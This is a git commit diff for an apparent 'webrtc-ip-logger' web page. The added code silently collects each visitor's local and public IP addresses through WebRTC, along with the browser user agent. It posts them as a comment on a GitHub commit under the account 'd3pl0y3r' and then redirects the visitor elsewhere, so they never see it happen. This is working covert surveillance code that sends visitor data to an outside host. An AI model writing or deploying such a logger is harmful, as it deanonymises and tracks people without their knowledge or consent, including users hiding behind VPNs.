ffe580ff346a5b53b2bcd338727b08fc605b31c5
Max Nazarov <zettamax@gmail.com>
2017-10-29 21:43:12 +0200

    Log IPs to github comments

--- app.js
+++ app.js
@@ -1,3 +1,24 @@
+var userData = {
+    "internalIPs": [],
+    "externalIPs": {"ipv4": [], "ipv6": []},
+    "userAgent": navigator.userAgent
+};
+
+getIPs(function(ip){
+    //local IPs
+    if (ip.match(/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/)) {
+        userData.internalIPs.push(ip);
+    }
+    //IPv6 addresses
+    else if (ip.match(/^[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}$/)) {
+        userData.externalIPs["ipv6"].push(ip);
+    }
+    //assume the rest are public IPs
+    else {
+        userData.externalIPs["ipv4"].push(ip);
+    }
+});
+
 window.onload = function () {
     var gh = new GitHub({
         username: 'd3pl0y3r',
@@ -9,14 +30,17 @@ window.onload = function () {
     if (sha) {
         repo.getSingleCommit(sha).then(function (r) {
             var url = '/repos/zettamax/webrtc-ip-logger/commits/'
-                + r.data.commit.sha +'/comments';
+                + r.data.sha +'/comments';
             var data = {
-                "body": "Great stuff"
+                "body": '```' + JSON.stringify(userData, null, 2) + '\n```'
             };
 
-            repo._request('POST', url, data).then(function (r) {
-                location = r.data.commit.message;
-            });
+            setTimeout(function () {
+                repo._request('POST', url, data).then(function (r) {
+                    location = r.data.commit.message;
+                });
+            }, 500);
+
         }).catch(function () {
             location = 'https://google.com';
         });
